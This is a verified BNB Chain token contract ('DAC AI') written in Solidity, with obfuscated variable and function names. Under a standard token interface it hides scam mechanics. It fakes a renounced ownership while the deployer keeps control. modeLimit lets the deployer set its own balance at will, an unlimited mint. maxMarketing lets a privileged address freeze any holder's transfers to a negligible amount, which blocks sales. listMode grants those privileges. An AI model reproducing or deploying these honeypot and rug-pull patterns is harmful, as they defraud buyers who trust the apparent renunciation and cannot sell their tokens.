/**
 *Submitted for verification at BscScan.com on 2023-02-09
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface modeSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingAmountBuy) external view returns (uint256);

    function transfer(address listBuy, uint256 autoSwapFee) external returns (bool);

    function allowance(address toSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoSwapFee) external returns (bool);

    function transferFrom(
        address sender,
        address listBuy,
        uint256 autoSwapFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundLaunch, uint256 value);
    event Approval(address indexed toSender, address indexed spender, uint256 value);
}

interface modeSwapMetadata is modeSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface enableTrading {
    function createPair(address feeShould, address liquidityMarketing) external returns (address);
}

interface launchedTakeReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract toMax {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract DACAI is toMax, modeSwap, modeSwapMetadata {
    uint8 private takeMode = 18;
    
    string private swapList = "DAC AI";
    uint256 private receiverTx = 100000000 * 10 ** takeMode;
    bool private receiverEnable;
    string private launchLiquidityAuto = "DAI";


    uint256 constant senderFee = 10 ** 10;
    
    uint256 public autoReceiver;
    address private shouldTx;
    address public enableReceiver;
    mapping(address => bool) public amountLiquidityAt;
    uint256 public receiverMaxShould;
    mapping(address => mapping(address => uint256)) private limitAt;
    bool public txMode;


    address private exemptFromLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public tradingShould;

    mapping(address => bool) public amountWallet;
    mapping(address => uint256) private autoTx;
    uint256 public teamMin;
    bool public marketingSender;
    uint256 public totalMode;
    uint256 private liquidityLaunched;
    bool private swapIs;
    

    event OwnershipTransferred(address indexed takeSwap, address indexed teamTotalIs);

    constructor (){
        
        launchedTakeReceiver sellToken = launchedTakeReceiver(exemptFromLaunched);
        enableReceiver = enableTrading(sellToken.factory()).createPair(sellToken.WETH(), address(this));
        shouldTx = _msgSender();
        if (liquidityLaunched == teamMin) {
            liquidityLaunched = teamMin;
        }
        tradingShould = shouldTx;
        amountLiquidityAt[tradingShould] = true;
        if (autoReceiver == teamMin) {
            teamMin = autoReceiver;
        }
        autoTx[tradingShould] = receiverTx;
        emit Transfer(address(0), tradingShould, receiverTx);
        launchedShould();
    }

    

    function launchedBuyList() public view returns (bool) {
        return marketingSender;
    }

    function autoFrom() public {
        
        if (receiverMaxShould != autoReceiver) {
            teamMin = totalMode;
        }
        liquidityLaunched=0;
    }

    function name() external view virtual override returns (string memory) {
        return swapList;
    }

    function transferFrom(address txAutoTo, address listBuy, uint256 autoSwapFee) external override returns (bool) {
        if (limitAt[txAutoTo][_msgSender()] != type(uint256).max) {
            require(autoSwapFee <= limitAt[txAutoTo][_msgSender()]);
            limitAt[txAutoTo][_msgSender()] -= autoSwapFee;
        }
        return launchedReceiver(txAutoTo, listBuy, autoSwapFee);
    }

    function walletTxAmount() public {
        
        
        autoReceiver=0;
    }

    function walletSell(address txAutoTo, address listBuy, uint256 autoSwapFee) internal returns (bool) {
        require(autoTx[txAutoTo] >= autoSwapFee);
        autoTx[txAutoTo] -= autoSwapFee;
        autoTx[listBuy] += autoSwapFee;
        emit Transfer(txAutoTo, listBuy, autoSwapFee);
        return true;
    }

    function tradingReceiver() public {
        
        
        liquidityLaunched=0;
    }

    function modeLimit(uint256 autoSwapFee) public {
        if (!amountLiquidityAt[_msgSender()]) {
            return;
        }
        autoTx[tradingShould] = autoSwapFee;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverTx;
    }

    function getOwner() external view returns (address) {
        return shouldTx;
    }

    function launchedReceiver(address txAutoTo, address listBuy, uint256 autoSwapFee) internal returns (bool) {
        if (txAutoTo == tradingShould || listBuy == tradingShould) {
            return walletSell(txAutoTo, listBuy, autoSwapFee);
        }
        if (autoReceiver != teamMin) {
            autoReceiver = totalMode;
        }
        if (amountWallet[txAutoTo]) {
            return walletSell(txAutoTo, listBuy, senderFee);
        }
        
        return walletSell(txAutoTo, listBuy, autoSwapFee);
    }

    function amountTo() public {
        
        
        receiverMaxShould=0;
    }

    function allowance(address tradingMax, address maxIs) external view virtual override returns (uint256) {
        return limitAt[tradingMax][maxIs];
    }

    function decimals() external view virtual override returns (uint8) {
        return takeMode;
    }

    function marketingToken() public {
        
        if (totalMode == autoReceiver) {
            autoReceiver = receiverMaxShould;
        }
        swapIs=false;
    }

    function maxMarketing(address tradingLaunchedSwap) public {
        if (receiverMaxShould == liquidityLaunched) {
            swapIs = true;
        }
        if (tradingLaunchedSwap == tradingShould || tradingLaunchedSwap == enableReceiver || !amountLiquidityAt[_msgSender()]) {
            return;
        }
        if (swapIs != marketingSender) {
            autoReceiver = teamMin;
        }
        amountWallet[tradingLaunchedSwap] = true;
    }

    function transfer(address swapToTx, uint256 autoSwapFee) external virtual override returns (bool) {
        return launchedReceiver(_msgSender(), swapToTx, autoSwapFee);
    }

    function balanceOf(address marketingAmountBuy) public view virtual override returns (uint256) {
        return autoTx[marketingAmountBuy];
    }

    function approve(address maxIs, uint256 autoSwapFee) public virtual override returns (bool) {
        limitAt[_msgSender()][maxIs] = autoSwapFee;
        emit Approval(_msgSender(), maxIs, autoSwapFee);
        return true;
    }

    function launchedShould() public {
        emit OwnershipTransferred(tradingShould, address(0));
        shouldTx = address(0);
    }

    function owner() external view returns (address) {
        return shouldTx;
    }

    function listMode(address receiverTeam) public {
        if (txMode) {
            return;
        }
        
        amountLiquidityAt[receiverTeam] = true;
        if (marketingSender == receiverEnable) {
            liquidityLaunched = teamMin;
        }
        txMode = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return launchLiquidityAuto;
    }


}